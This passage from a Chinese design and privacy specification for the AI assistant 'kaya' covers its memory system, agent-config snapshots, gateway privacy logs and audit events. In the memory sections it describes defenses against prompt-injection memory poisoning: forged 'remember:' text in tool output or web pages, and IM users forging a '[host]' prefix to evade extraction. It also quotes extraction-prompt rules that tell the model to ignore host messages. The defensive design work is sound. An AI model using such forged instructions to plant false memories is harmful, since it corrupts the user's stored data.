重新提供原消息),符合规则 / 事实 / 语义条件的直接生效,容量或校验不
满足的归档,无法形成有效内容的拒收;每项成功后出队,**失败项保留供
下一次自动重试**。崩溃后重跑靠 kind + scope 去重保持幂等。
`memory_stats.review_pending` 因此只表示「还有几条没迁成的技术重试
项」,不是人工待办(前端不显示为待办 / 角标),归零只表示没有遗留
迁移工作。

**pre-PR 语义候选的形状采纳(PR #146 打回修复)。** 旧行的
`operation` / `evidence` 字段尚不存在(反序列化缺省 `Add` /
`UserAsserted`),语义候选的**唯一标记**是 `semantic_member_ids` ——
旧 `review::apply_review` 也正是按它判语义(落 Semantic + 逐条回填成员
`superseded_by`)。迁移适配层把**精确旧形状**(`kind=Fact` + 有成员指针 +
`Add` + `UserAsserted`)采纳为 `Generalize` + `SemanticCluster`;不采纳就
走 Add 普通事实化,语义降级、成员永不失效(仍留在检索池与索引里)。
普通 legacy 事实(无成员指针)与显式新候选(显式声明了别的 operation /
evidence)一律不转换,**在线候选的裁决语义不受影响**(该适配只发生在
legacy 迁移这一条路径上)。判据看字段值而非 JSON 里有没有这两个键 ——
迁移失败留下的重试项会被整写回队列(带上显式字段),下一轮仍须按同一条
旧语义候选适配。

**窄路径回落(成员全部失效时)。** 采纳后若因「成员全部失效」(全部
Archived / Tombstone / 被别的条目取代)被拒收 —— 拒收码**精确**为
`generalize_no_valid_members` —— 迁移层用**原始候选**(`Add` /
`UserAsserted`)再裁决一次,落成普通事实。原因:被拒收的候选不进
pending,队列最后整写会把候选文本**永久抹掉**;pre-PR 会保留 Semantic
内容,形状采纳修复前也只退化成普通事实,两条路都不丢内容。回落判据取自
裁决器**实际返回的拒收码**,不复制 `commit_generalize` 的成员活跃性预检
(复制会与它的校验逻辑漂移);只在「本次确实采纳过形状」且拒收码精确匹配
时回落,其它拒收码一律不回落。

**语义记忆层(2026-10-03)。** 巩固管线收尾时对活跃情景条目做
单 linkage 聚类(jaccard ≥ 0.4);同一主题簇 ≥3 条且未被既有语义
条目覆盖时,由 LLM 把整簇概括为一条一般性知识(单轮最多 3 簇,
配额护栏)。合法语义候选**直接以 Semantic 入库**(不再入队):成员
条目回填 `superseded_by` 指针(归纳不是
替换,情景本体永不丢,时间线仍可见),语义条目 status=Semantic、
不参与衰减、检索时 time_decay 恒为 1.0。默认检索排除已归纳成员
(详情由语义条目代表;`include_archived` 时回归可搜)。LLM 归纳
外发范围与巩固抽取同一通道(BYOK / 内置 / Ollama 三态一致);
归纳 prompt 同样禁抽凭据、只输出 JSON。

**显式「记住」指令(2026-10-01 加固,三层保证)。** 你在对话里明确说
「记住:…」时,记忆写入不再依赖巩固管线的时机与模型的自觉:
① pure 指令(整条消息就是「记住:X」)由前端本地拦截,原文先过
用户输入 guard(secret/PII 脱敏,与聊天气泡同一份),再经
`memory_capture_direct` 命令直接入库(零 LLM 回合、零外发、无登录/
付费门——纯本地落盘);② inline 指令(「记住 X,然后做 Y」)走正常
LLM 回合,但 `memory_add` 写入工具**只在检测到记住意图的回合注册**
(`memory_write_intent` 门控)——普通回合的工具表里没有它,工具
输出 / 网页里伪造的「记住:…」文本无法诱使模型写记忆(防注入投毒;
2026-10-08 起 IM 渠道同样按意图门控注册 memory_add —— IM 按
allowlist 授信渠道对待,普通回合工具表没有它这一点两端一致);③ 意图回合结束模型仍未调用 memory_add 时,Rust
把检测器剥离并 scrub 后的待记正文(未经模型提炼)**直接入库**(保留「记住永不静默丢失」),结局
由专用事件 `memory_fallback_completed` 上报 —— 只带 `conversation_id` /
`memory_id` / `status`,**不带任何原文**;归档结局(规则满容)在桌面
气泡 / CLI 确认文案里明说「已归档,未生效」,兜底写入失败只 warn、
不发事件(不会谎称已记住)。capture 路径复用巩固的 jaccard 去重:重复「记住」同一内容只
强化既有条目(salience +0.1),不产重复条目;入库版本链
actor = User、reason = explicit_remember。意图检测(2026-10-05 召回
扩容)是指令前缀匹配(你记住 / 您记住 / 请记住 / 帮我记住 / 帮我记(一下/着)/
麻烦记住 / 别忘记 / 别忘了 / 记住 / 记一下 / please remember /
remember this / keep in mind / don't forget / do not forget /
remember,裸 remember 与「don't/do not forget」后随 "to " 的自我提醒形态有收紧守卫)+「把 X 记住|记一下|
记下」整句倒装;2026-10-09 起收录**第二人称前缀「你记住/您记住」**
(此前为防「你记住了吗?」反问一刀切拒收,把最高频祈使形态也拒了——
真实漏召回:整句「你记住:X」三层路径全 miss),带三条收紧守卫:
后随「了」(反问/陈述的完成体)、剥语气词后无内容(「你记住啊」)、
无显式分隔符且陈述谓词结尾(「你记住这个知识点很重要」是话题陈述)
不命中;同批「剥语气词后为空一律不命中」收口(「记住吧」不再直写
单字垃圾);2026-10-08 召回扩面新增**子句级扫描**——整句未命中
时按句读(。!?…;,,;!?. 与换行)切子句,每个子句首跑同一张前缀表,
并识别句尾祈使形态(「…,记住」「这点记住」「把它记下来」/ en
"…, remember this/that"、"don't forget this/that");子句级命中
**一律走 inline**(进 LLM 回合由模型带完整上下文提炼,不做机械直写),
且带反问/陈述守卫(「你记住了吗」「我记不住」「记住这个知识点很
重要」「do you remember this」「i can't remember this」不命中,
「记到待办」继续让位任务门)。检测只在**你自己消息的文本**上做(绝不根据工具输出
或模型自主判断开放写入),提取内容是回指代词(这个/那条/它/this/
that)时不本地直写、改判 inline 交给模型结合上下文解析;提取内容
是任务形态((一)个/条/项 + 待办/任务,或「待办:X」/「todo: X」)
时记忆门主动让位返回不命中 —— 建任务指令落回任务意图门 / LLM 的
task_list create,不落记忆库(2026-10-05,修「帮我记个待办」被
记忆门吞成垃圾条目;en 臂只收单数 task/todo,复数 + 冒号是电报式
陈述主语,属合法记忆)。

**意图检测双闸拆分(2026-10-09)。** 上述 strict 表(整句前缀/倒装/
子句锚定 + 守卫)继续独占 pure 直写与待记正文兜底两条高精度路径;
新增 **loose 关键词闸**只做一件事——`memory_add` 工具注册召回:祈使
倾向关键词(记住 / 别忘了 / 别忘记 / remember / keep in mind /
don't forget,刻意不收裸「记得」「记忆」)出现在你消息的任意位置即
注册,先剥离第一人称陈述/完成形态(我记住了 / 我记不住 / 我记住啦 /
i remember / i can't remember——刻意不收裸「我记住」,否则
「让/请/给你帮我记住」祈使句被连带剥离)、第二人称反问(你记住了 /
do you remember)与自我提醒(remember to / forget to)再判定。loose 回合的写入**同样直接生效**:loose 只影响工具注册召回,不改变存储结局(`review_only` 模式与「待确认」文案已删除;`ChatArgs.memory_write_review_only` 作为旧 wire 字段保留,但不再影响行为),且回合末仍不挂待记正文兜底(防陈述句命中产生噪音)——strict 漏召回的代价从「整条链路静默失效」降级为
「失去零回合直写,走带工具的 LLM 回合」,写入仍会落地。词表与测试基线
是**单一来源**(`crates/kaya-core/data/remember_loose{,_cases}.json`,
Rust 与 TS 读同一文件、跑同一组用例,改词表只动 JSON,双端零漂移);
注册仍只由你自己消息的文本驱动(工具输出里的「记住」触发不了),
桌面 / IM / CLI 三端同口径。

**巩固管线的输入过滤与健壮性(2026-10-01)。** 抽取输入在序列化层
剔除 host 系统合成消息(msg id 前缀 `interaction-host-` /
`grant-resume-` / `host-`,2026-10-04 起收敛为 msg id 单口径:
host 回合的用户消息落盘即分配结构性 `host-` 前缀 id;content 的
`[host]` 文本前缀可被 IM 用户伪造以绕过记忆抽取,不再作为判据,
抽取提示词中「忽略 [host] 消息」规则保留为双保险)——系统提示语
不会被记成你的事实;抽取提示词显式禁止抽取密钥/密码/令牌/证书(凭据类事实只记
存放位置)。模型给出的候选时间在 `[会话创建时间, 当前+5min]` 之外
(幻觉的旧年份/远未来)按解析失败处理,回退到来源消息时间。长会话
按 64KiB 分批抽取、游标逐批落盘推进,单条超限消息截断保留 id,不再
整会话卡死反复烧配额。首次运行不做回溯(2026-10-02):记忆里从未
巩固过(无游标)时,存量会话的游标直接种子化到末条消息 —— 既往
会话历史不被抽取,记忆从启用时刻开始,只有之后的增量进入巩固。
一致性:记忆 IO 锁下沉到 kaya-core(桌面命令、
LLM 工具命中回写、CLI 共用同一把进程内锁),月分片回写改为「重读按
id 合并」——进程内并发写入不再互相覆盖丢条目;桌面 ↔ CLI 跨进程
仍有竞争窗口(锁是进程内的),重读合并只能大幅降低丢失概率,不能
完全消除。

**写入侧 scrub 收口(2026-10-08;2026-10-28 扩到全部自动写入)。** 显式
「记住」的写入在
`capture::capture_direct` 单一收口点过 Strict scrub(memory_add 工具 /
memory_capture_direct 命令 / CLI remember 三个调用方同源):命中
secret 形态的片段落 `[REDACTED:*]` placeholder,整段只剩单个
placeholder 则拒写(`content_redacted`;memory_add 映射为本地化错误,
待记正文兜底走同一条闸,不再另开出口)。2026-10-28 起**每一笔自动写**
(`autonomy::commit_candidate`)入库前都过同一条内容闸 —— trim →
Strict scrub → UTF-8 字符安全截断 —— 之后才允许落盘,app_log 与拒收
原因短码**零候选原文**。核心块渲染(`render_core_block`)注入
前逐条再过一次 Strict scrub 兜底(覆盖全部存量
写入路径,≤2KB/回合)——secret 形态文本无法经记忆固化后每回合外发。

**检索与注入的外发面。** 已入库记忆在两个时刻离开本机(随对话发给
当前 provider):① 核心记忆块作为一条独立的 system 上下文消息
(固定 index 1,≤2KB,不含进 system prompt 本体预算)**每回合**
随对话发出 —— 置顶到核心即意味着"每次对话都带上它",**含 IM
渠道(飞书/企微/Slack)与远程会话的回合**(2026-10-02 拍板:IM
准入 allowlist 限本人,模型在 IM 答复里可能引用核心记忆内容,该外发
面是有意接受的;2026-10-08 起 memory 检索工具也注册进 IM —— 同一
授信渠道策略,输出过 output scrub、tombstone 不可见、原始文件子树
拒读保留);
② 三个
memory 检索工具的输出在工具内过 **output scrub**(secret/PII 正则 +
PEM 整块 redact 照常跑,与 terminal_read 同款纪律;2026-09-05 终审
修复:此前文档称"scrub 自动生效"但工具未接 scrub,已补齐)。

**删除即遗忘。** 无云同步意味着删除是真实的:删掉整个
`~/.kaya/memory/` 目录即彻底遗忘,本机之外没有任何副本。删除有两档
语义(2026-10-02 起):「丢弃」(Discard)是逻辑删除 —— 落 tombstone
留痕(检索、列表、注入全部不可见),内容仍留在盘上,保证全程可审计;
「彻底删除」(设置 → 记忆 条目操作区,二次确认)是内容抹除 —— 条目
与**全部历史版本**的 content 被替换为 `[purged]`,不可恢复,只保留
条目 id 与版本骨架(v/ts/actor/reason)作为「这里删过一条记忆」的
审计记录。要连同骨架一起抹除,须删除对应文件或整个目录。

**传输面补充(同 §8 schedules 注同款约定)**:记忆内容本身是用户
自己的数据,核心注入块与 memory 工具输出的内容是原文发给 provider
(scrub 只管 secret/PII 类别,不改写语义内容)——与 task_list /
schedule_manage 快照的先例一致。

### 8.2 agent 配置快照域(2026-10-15,spec §4/§7)

模型库接管编程 agent 配置(claude-code / kimi-code / opencode)时,
kaya 在**首次从非 kaya 形态接管那一跳**把「kaya 会触碰的键」的原值
逐键快照到 `~/.kaya/agent-config-snapshots/<agent_id>.json`;撤除
(Revoke / 解绑 / 条目删除 / 退出写回 / boot 撤除统一走)时按逐键所有权和当前值恢复,保留用户后续修改;未恢复原值按下述被动备份规则处理。**恢复或备份流程可靠完成后才消费活动快照**(失败保留快照并记
`snapshot_restore_failed:<agent>` warn,下次撤除重试)。

- **内容口径(明示例外)**:快照含用户原值——包括用户自己配置的第
  三方网关 base_url / token(如 `ANTHROPIC_AUTH_TOKEN`)。这是「真实
  key 不落盘」口径的**明示落盘例外**:防护不依赖 keychain,而依赖
  `~/.kaya/` 域权限(目录 0o700、文件 0o600 原子写,与 audit/debug
  同级)。
- **未恢复原值的被动备份**：displaced 或逐键 flag 路径的当前值缺席或已改动时保留当前状态，不推断历史删除来源。仅该路径被覆写前原值保存到同目录 `<agent>.unrestored.<uuid>.bak`（排他创建、0600、写后读回），可靠保存后才消费活动快照；失败沿用 `snapshot_restore_failed:<agent>` 并保留活动快照重试。备份仅本机，不参与 trace 或 boot 自动恢复，不进诊断导出，无自动清理期限；用户可手动删除文件。备份不额外采集现有用户配置正文。
- **kaya 形态下不刷新**:重复 apply / force_apply / 形态迁移都不覆
  盖快照——快照锚定的永远是「kaya 第一次碰它之前」的用户态。
- **`snapshot_missing` 占位**:存量用户升级时接管前状态已不可知,落
  `{"snapshot_missing": true}` 占位;未知 keys 不伪造原值,无 sections 时撤除退化为纯摘除。v2 另行捕获的非 kaya sections 仍须按当前优先合并恢复,成功校验后才删快照,并记 `snapshot_missing:<agent>` warn。
- **日志/审计零内容**:快照事件(`agent_config_snapshot_taken` /
  `agent_config_snapshot_restored` / `snapshot_missing` /
  `snapshot_restore_failed`)payload 只带 agent_id + 键数 + 路径,
  **绝不记键值**;快照内容不进任何日志与审计。
- **OAuth token 不在快照域(2026-10-17,Phase 3)**:快照只覆盖 kaya 会
  触碰的 agent 配置键;OAuth access / refresh token 只存系统钥匙串
  (§8 独立逻辑键),既不写入 agent 配置,也不会被快照捕获 —— 接管 /
  撤除 / 恢复全程不接触 token。

### 8.3 通用 Agent 配置优化域(2026-10-21,spec §8)

「分析配置 → 建议卡 → 逐条勾选 → 一次性授权 → 写入 + 读回校验」
这条回路的隐私口径(spec §8 的六条,逐条对应):

1. **建议卡 / 事件携带的值一律双层脱敏**(键名敏感词表 + secret
   scrub),与 `agent_config action="read"` 同口径 —— 用户看到的不比
   模型少,也不比模型多。实现:`agents/config.rs::mask_json_secrets` +
   `llm/scrub.rs::scrub_text`。
   **键名敏感词表这一层只作用于显式标记为 `sensitive` 的键**:可授权键
   的值域受限(整数 / 布尔 / 枚举),用「叶子名含 token」这类子串启发式
   会把 `model_auto_compact_token_limit` 这种「token 计数」误判成密钥
   (既进不了可授权集合,又会在卡片上显示成 `***`)。真要放凭据类键,
   由白名单表显式标 `sensitive: true`。
   脱敏档位恒为 Strict(与 `agent_config_analyze`(`mode="inspect"` 分支)
   的输出同档)—— 用户
   档位若更宽松,用户看到的东西会比模型多,违反本条。
2. **审计只记键名与计数**:事件 `config-optimize-proposed` /
   `config-optimize-granted` / `config-optimize-applied` /
   `config-optimize-rolled-back` / `config-optimize-apply-failed` /
   `config-optimize-undone` 进
   **audit JSONL**(不是只进 app_log),payload 只含 agent_id、
   proposal_id、条目数与**键名** —— **值绝不进 audit / app_log / LLM
   上下文**。
   **脱敏后的值随消息流持久化**:建议卡与分析报告以消息形式进入聊天
   记录,Strict 档脱敏后的现值随 `messages` 落进 localStorage(与其它
   聊天消息同生命周期)—— 落盘的是脱敏后形态,不是原文。
3. **授权一次性、proposal 哈希绑定、用后即焚**:授权是内存态(进程
   重启即清),绑定 `proposal_id + 勾选子集的哈希`,apply 时校验一致
   即消费。**不复用 `ConfigEditGrantStore`**(会话级键集粒度太粗)。
4. **拒写键表语义不变,本方案不开放任何新的写面**:可授权键白名单
   (「模型行为与资源类」)是数据层,拒写键(执行 / 提权类 / 模型身份
   类 / 危险环境变量)命中即转「需手动操作」分组,永不进可授权集合。
5. **LLM 上下文中的配置内容已是脱敏后形态**:`agent_config_analyze`
   (`mode="inspect"`)只返回可授权键白名单内的现值(其它键 —— 尤其供应商凭据 —— 不进
   模型视野),且已脱敏。
6. **inspect 工具只读、零外发;proposal 校验零网络**:`agent_config_analyze`
   的 `mode="inspect"` 不写盘、不授权、不发事件;`mode="propose"` 走校验器
   出卡、同样不写盘;校验器是纯函数(现状 / 元数据 / tune 状态都由
   调用方注入)。
   **`parse ` / `read ` 读取错误剥源文本,其它错误按 value-free 约定透传**:
   toml 的错误 Display 会原样写出错的那一行(配置里常有 api_key 明文)——
   两个工具层(agent_config / agent_config_analyze)统一经
   `agents/config.rs::sanitize_config_read_error` 处理;该函数只压这两类
   前缀成「类别 + 路径」,拒写键 / 模型身份键 / 危险 env 等其它错误保留
   处置指引,不被一律压平。这不是「所有错误字符串都被清洗」的承诺:
   安全边界依赖 `agents/config.rs` 内所有新增错误保持 value-free
   (不得拼入配置值;允许路径 / 键名 / 系统错误文本 / 指导性文案),且
   调用方必须在错误进入模型前经过该函数。

**写前备份与回滚**:写盘走 `agents/config.rs::write_with_backup`
(同目录 `<file>.bak` + 0o600 原子写),**不复用 `config_snapshot`**
(其键集写死,且 boot 孤儿对账会把非接管 agent 的快照自动回滚)。读回
校验失败 → 自动从 `.bak` 恢复(走 `write_atomic`,不产二级 `.bak`)。
**撤销必须凭「落盘回执」**(proposal_id → 路径 + 备份哈希 + 写后文件哈希,进程内状态,
不含任何配置值):没有回执就拒 —— 否则会拿盘上别人(别的写入口)留下的
`.bak` 去覆盖用户的配置。回执是进程内的,**应用重启后撤销按钮置灰**
(卡片仍在,但撤销已不可用)。`.bak` 或当前配置被后续写入改变时撤销被拒并说明;写前不存在的文件也只有仍匹配本次写后哈希时才可删除。
**审计只记「回滚发生过」与计数,不记内容**;验证未通过**且**回滚也失败
时单独记 `config-optimize-apply-failed` —— 不能混进「已应用」。

**Phase 2 语义后验**:写入成功的键若映射到状态栏维度(catalog 的
`status_dimensions`,数据层),交互 watcher 解析到目标值即发确认事件
把卡片翻成「已生效」;解析不到**不是失败**(用户还没重启 agent),
卡片停在「待生效确认」,超时翻「未确认」—— **语义未确认 ≠ 写入错误,
不自动回滚**,由用户决策。

### 8.4 网关隐私保护明细(2026-10-21,第二条内容落盘明示例外)

模型网关令牌化明细(生效时机 / agent / 路由 / 类别 / 动作 / **原文** /
替换后令牌 / 恢复次数 / 出现次数)落盘 `~/.kaya/gateway/privacy-events.jsonl`
(0o600,90 天查询窗口 / 5000 条记录上限,设置页可清空当前筛选或全部)。
90 天是查询过滤窗口,过期原文与 patch 的物理清除随淘汰压实或用户清空触发,
没有定时擦除。**写入与淘汰节奏(2026-11)**:一个网关请求的命中记录**一次**
批量落盘(一次全局锁,追加阶段只打开一次文件),不再逐命中追加;满额淘汰同样**按批**:
tokenized 一次腾 500 条、warned 一次腾 50 条,腾出的余量让后续追加在余量
内不再整文件重写(此前逐条追加在满额后每条都要读全文件 + 整文件原子重写,
把 blocking 线程池打满,连带键盘写入无法调度)。淘汰顺序(过期 → 「同身份
已有更新副本」的旧记录 → FIFO)、双池上限、90 天窗口与落盘内容(原文 /
令牌 / 诊断维度)逐字不变。批量腾位使满额附近的实际保留量在 tokenized
4500–5000 条、warned 450–500 条间波动（单条追加腾位后为 4501 / 451 条）；
过期清理、未满额或用户清空后保留量可以更低,这些区间不是无条件下限。
restore patch 同样按一次响应内的一批命中持锁并打开文件一次,不改变逐 token
计数与 request_id 关联。单次请求的命中条数超过池容量时
按池只保留**最新**的上限条数(池容量是硬上限)。批量追加失败时可能已有部分
完整记录落盘:原样返回错误并使该目录的双池计数缓存失效,下次追加前按盘上
实际记录数重计,再判断是否淘汰,避免恢复写入突破任一池上限。
同一请求内同身份
命中合并为一条并累加 `occurrences`
(2026-10-26 起同身份聚合键扩到**九维**:agent / 路由 / 类别 / 动作 /
content_kind / decision_reason / app_version / protocol + 内容 —— 同一段内容在
不同内容类型或决策原因下是独立一行,否则按维度筛选的计数会失真)。
2026-10-24 起,设置页查询按 agent / 路由(含模型)/ 类别 / 动作 / 原文做内存
聚合,输出首次 / 最近出现时间、聚合行数与原始记录数;聚合不新增落盘内容。
2026-10-29 起,设置页默认展示全部规则记录,并在**聚合后、分页前**按
「未改写 warned → named_secret → validated_pii → pattern_pii → named(旧记录)→
heuristic → 未知 → 已令牌化」优先排序,同级按最近出现时间倒序;旧记录的有效
置信度与筛选共用同一推导,不推断 v2 细分。`warned` 只表示**原文未替换、需要
结合关联请求结局核验**,不宣称已经泄露。主表只保留定位信息,完整原文 / 令牌、
原始时间戳、字段路径、请求 ID、决策原因与恢复记录在用户显式展开后显示;展开区
可经 Rust 固定文件名命令 `gateway_open_log` 打开本机 `privacy-events.jsonl`
(非 macOS 用系统 `open_path`),请求审计默认折叠并可打开 `request-events.jsonl`;命令不
接受 WebView 路径,不新增权限、不经网络传输日志内容。macOS 显式调用
`/usr/bin/open -a TextEdit`,避免 `.jsonl` 没有默认关联;打开动作会把含明文原文的文件交给用户本机
编辑器,编辑器自身的同步行为不属于 kaya 控制面。
统计窗口按原始命中记录时间选取；还原 patch 挂回最近同 token 的记录后计入其还原汇总，
即使还原发生在窗口外也计入，不是“窗口内还原事件数”。日趋势按本机日历日；
坏时间戳仅接受合法 YYYY-MM-DD 前缀，否则归入 unknown，保留明细与总量但跳过趋势。
概览出现次数 = occurrences 原始命中之和，独立内容按类别与原文去重；列表按完整维度与
内容聚合，行数不可当成上述两项。Agent chips 与还原汇总常显；统计仅展示当前时间窗已
加载的数值，失败保留筛选维度并提供打开本机日志/清理的恢复入口。读取错误(含坏 UTF-8)
不缓存为零，不隔离或删除原文，下一次操作可重试。`gateway_log_path` 只接受 privacy/request/compatibility，
返回 Rust 解析的绝对路径；打开命令文件检查/平台执行走后台阻塞任务，macOS 等待并回收
子进程且检查退出状态，缺文件显示“日志尚未生成”。
明细 schema 自 2026-10-26 起为 **v2**(`schema_version: 2`):新增九个**可选**
诊断字段(schema_version / request_id / app_version / rule_version / protocol /
field_path / content_kind / confidence / decision_reason),旧行缺这些键仍可读且
旧序列化形状不变,新字段为 None 时不落键;旧记录的新维度**永不推断**,筛选只认
显式值(唯一例外是 `confidence`:旧行按类别双分 —— `entropy-string` 归
`heuristic`,其余归 `named`;`named_secret` / `validated_pii` / `pattern_pii`
只认显式声明)。置信度词表 = `named`(旧记录伞形值)/ `named_secret` /
`validated_pii` / `pattern_pii` / `heuristic`,过滤条件写错一律 fail-closed
(不匹配任何记录)。`app_version` 由**宿主壳层注入**(src-tauri 的
`CARGO_PKG_VERSION`,与请求事件共用同一来源;kaya-core 自身不再用 crate 版本)。
**warned 与 tokenized 分池**:仅告警不改写的命中数量级远高于令牌化(strict 档
高熵兜底尤甚),故 warned 明细独立 **500 条**上限(tokenized 仍是 5000 条),两池
各自按同一淘汰顺序收敛 —— 淘汰 warned **不得**挤掉 tokenized 历史,升级也不做
启动时大扫除(旧记录只按既有规则自然收敛)。
类别、动作、Agent、模型、规则置信度、时间窗与原文 / 令牌搜索均在 Rust 本机
过滤,选择性清空复用同一组条件,搜索词也计入「非全量清空」判定。查询结果里
`raw_total` 是当前筛选下的**视图原始记录数**(只用于「N 条原始记录」摘要),
`clearable_total` 才是**可清除记录数** —— 它与 `clear_filtered` 的实际删除
谓词同源(维度 + 删除口径时间窗),清空确认文案与「清空当前视图」的禁用都只
用后者。带时间窗时无法解析时间戳的记录读取侧可见、删除侧不命中,因此清空成功
后视图可能仍有记录:前端按当前筛选重查,不本地置零假定空视图。明细文件不存在
(`NotFound`)或为空时仍按无记录返回;权限、路径类型等真实读取 I/O 错误不得
折叠成空结果:`gateway_privacy_stats` / `gateway_privacy_records` 以固定零内容
哨兵 `privacy_read_failed` 失败,不上送 OS 错误、路径或文件内容。
`gateway_privacy_clear` 遇到读取失败同样返回该哨兵并停止,不继续创建目录或
原子重写;建目录或原子写失败则返回固定零内容哨兵 `privacy_write_failed`,
也不上送 OS 错误、路径或文件内容。**时间边界在读取侧忽略非法值(该侧不设限),
删除侧必须拒绝**:
`since` / `until` 传了
非空但无法解析的串时,`gateway_privacy_clear` 返回固定哨兵
`privacy_invalid_time_boundary:<since|until>` 且不删除任何记录 —— 否则
`since=garbage` 会被当成「不设限」,把选择性清空放大成全量清空 / 该维度全
时间范围删除(`clear_filtered` 自身同样 fail-closed)。淘汰顺序中的「同身份
已有更新副本」把**即将写入的那条**算作最新副本:满 5000 条唯一记录时重放
一个已存在身份,淘汰的是盘上旧副本,不会 FIFO 删掉最旧的唯一记录;同 token
重放时 incoming 的 token 也算幸存,被淘汰旧副本的 restore patch 不得当孤儿
删除(新副本继承恢复计数与时间)。搜索词只在
单次查询的内存比对中使用:不落盘、不进 app_log,过滤器 Debug 输出打
`<redacted>`(有测试锁)。
明细查询不会主动外发原文:不进审计流(审计 gateway-scrub 零内容不变量
原样保留)、app_log、debug dump,也不自动注入 LLM。桌面/CLI 用户显式
通过 trusted-read 读取仍按既有授权边界与输出 scrub 处理;IM 渠道回合读闸
拒绝该目录,跨机专用工具表无文件读取入口。Token 用量统计(`~/.kaya/usage/`)
只记计数与模型/供应商/agent 标识,零内容。

**零内容请求事件流(2026-10-26,spec §10.2)**:与明细**并列**另落一份
`~/.kaya/gateway/request-events.jsonl`(0o600,目录 0o700;30 天查询窗口 /
20000 条上限,满额时**批量**淘汰最旧 1000 条再追加,重写时顺手物理清除过期行)。
每条只含 17 个结构化键:schema_version(1)/ request_id(uuid v4,本地随机、不由
内容派生)/ ts / app_version / rule_version(`gateway-privacy-actions-v3`)/
agent / route_entry / protocol / stream / transformed_fields(**唯一 field_path
计数,不是命中条数**;空路径的命中每个计 1)/ category_counts(类别 → 命中次数)/
existing_placeholders / media_preserved / media_rejected(**每请求 0/1**:首个
失败即拒请求)/ restored_exact / outcome(completed / upstream_error /
client_aborted / media_rejected / tokenize_rejected / no_credential /
internal_error)/
upstream_status —— 结构上**无原文、令牌、完整字段路径或消息体**,wire 键由测试
锁死(`no_credential` = 路由缺可用凭据 —— 2026-10-27 起 ChatGPT 订阅
缺账号身份时请求零上游)。每条进入 `before_request` 的 Content 类请求恰好一条事件:`finish_once` 幂等,未交卷即 drop(客户端提前断开)由
Drop 兜底 `client_aborted`,上游状态码照常带上;写失败只留零内容 warn,绝不影响
模型请求。设置页「请求指标」四件套(请求数 / 改写请求数 / 上游 4xx / 精确恢复)
按同一组筛选统计,**媒体筛选**用短码 `preserved` / `rejected` / `none`(语义是
「该请求有没有这类媒体字段」,可同时命中前两者;未知短码 fail-closed 匹配不到
任何事件),指标与列表**同源**(统计复用同一 `events` 过滤路径)。

**零内容兼容诊断事件流(2026-11-03,2026-11-04 收口)**:异常或不满足历史保真条件的
签名 thinking 因改写会破坏协议完整性而被本地拒绝时,另写 `~/.kaya/gateway/compatibility-events.jsonl`
(0o600,目录 0o700;30 天 / 5000 条,满额批量淘汰最旧 500 条并物理清除过期行)。
冷启动计数只有读取成功后才缓存;既有文件发生 I/O 或 UTF-8 读取错误时停止本次
追加,不缓存零值,恢复可读后重新计数再执行容量淘汰。
每条与 request event 共享 request_id,只含 15 个结构化键:schema_version /
request_id / ts / app_version / rule_version / agent / route_entry / protocol /
field_path(固定协议路径)/ content_kind / category / action / decision_reason /
fallback_decision(`rejected_no_safe_fallback`)/ retry_outcome(`not_attempted`)。
结构上无 original / token / truth / signature / base64 / messages / upstream_response,
不保存原文、令牌、签名或完整错误响应,不自动省略历史块、不原文重试、不上传。
满足上文历史保真条件的正文不扫描,不会产生此拒绝事件。
当前没有生产 UI 读侧；可用固定类型命令 `gateway_open_log { kind: "compatibility" }` 打开该文件,
或在本机终端运行 `open -a TextEdit ~/.kaya/gateway/compatibility-events.jsonl`
（macOS）/ `notepad "$env:USERPROFILE\.kaya\gateway\compatibility-events.jsonl"`
（Windows PowerShell）。未来增加 UI 消费者时须先验证读侧字段与兼容 spec §8 一致。

**清空语义**:`gateway_privacy_clear` 分两路 —— **选择性清空**
(任何一条筛选条件非空)只删命中的**明细**行,请求与兼容事件一条不动;**全空筛选**
(真正的全量清空)先清明细、再清请求事件、最后清兼容事件。第二步失败返回
`privacy_request_log_clear_failed`,第三步失败返回
`privacy_compatibility_log_clear_failed`,均属**部分失败且可见**:此前已清内容不回滚,
前端必须按「部分失败」呈现,不得声称「全部已清」或「全部未清」。
新增维度(content_kind / decision_reason / app_version / protocol)全部计入
`is_empty` 与删除谓词,带新维度的筛选**不得**被当成空筛选(否则退化成全量清空)。

**开关关系(如实声明)**:请求 / 兼容事件与隐私明细**共用同一个内部 `privacy` 开关**
(`GatewayState::privacy_base_dir()`,生产恒 true;关掉时三类一起停写)。spec
§10.2 要求的是「独立事件流 + 独立保留预算」,不是独立闸门;若将来增加面向用户的
「关闭隐私记录」开关,**必须先把各道闸拆开** —— 否则用户关掉明细时会静默停写
请求事件,请求级统计的分母随之消失。三份文件(含原子写的 `.tmp` / `.bak` 变体)
都在诊断导出排除闸内,不会随支持包外发。

---

## 9. 审计 Trail(事后取证)

源码: `src/lib/audit.ts` + `auditTypes.ts` + `auditEval.ts`

每次 chat session 开启时,前端 `recordEvent` 把事件落到
`~/.kaya/audit/s_<sessionId>/events-*.jsonl`(7 类定义,其中
`reasoning-chunk` 为 legacy,新会话实际落其余 6 类):

1. `session-start` — 会话开始(记 `previousSessionId`,链可追溯)
2. `user-input` — **scrub 后**的输入 + 原始字节数 + redactions
3. `tool-call-decided` — policy / safety 决策 + 阶段 + 理由
4. `tool-call-completed` — 执行结果 + redactions + error
5. `assistant-turn` — 完整一轮输出 + `systemPromptFingerprint` + `durationMs`
6. `reasoning-chunk` — 推理流式片段(**legacy**:round-114 起 reasoning 批量
   并入 `assistant-turn.reasoning` 字段,本事件仅为回放旧 JSONL 兼容保留)
7. `error` — 错误事件

`UserInputEvent.text` 是 scrub 后的文本,**不是**原始输入 — JSONL
文件本身不会泄漏 secret。

带图消息的 `user-input` 事件只附 `images: [{ mime, bytes }]` **元信息**
(类型与字节数),图片内容不落审计 JSONL(2026-10-02,粘贴图片);debug
capture 的 history 过滤只序列化 role + content,`Message.images` 永不进
debug dump(`debug_history_filter_never_serializes_images` 测试锁)。两层都
不含图片字节,「审计 / 导出无图」由此结构性成立。

通用 Agent 配置优化(§8.3,2026-10-21;2026-10-24 起共 6 类)的事件是
`config-optimize-proposed` / `config-optimize-granted` /
`config-optimize-applied` / `config-optimize-rolled-back` /
`config-optimize-apply-failed`(验证未通过**且**自动回滚也失败)/
`config-optimize-undone`(用户在应用成功后主动撤销,只在真恢复时写零值
事件;与「自动回滚」区分):由壳层
写入**同一个 session 的 audit JSONL**(不是只进 app_log),payload 只含
agent_id、proposal_id、条目数与**键名** —— 值绝不进审计。

模型网关(§7.11,2026-10-13)的命中审计是另一类事件(网关专属)
`gateway-scrub`:由网关进程自己写入(session 固定 `"gateway"`,
